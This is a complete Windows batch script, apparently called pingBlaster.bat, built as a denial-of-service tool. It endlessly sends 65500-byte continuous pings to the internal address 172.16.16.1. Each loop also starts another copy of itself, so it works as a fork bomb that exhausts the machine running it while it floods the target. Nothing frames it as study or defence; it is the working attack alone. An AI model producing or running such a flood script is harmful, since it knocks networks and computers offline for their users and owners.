@echo off
:flood
ping -l 65500 -t 172.16.16.1
start pingBlaster.bat
goto flood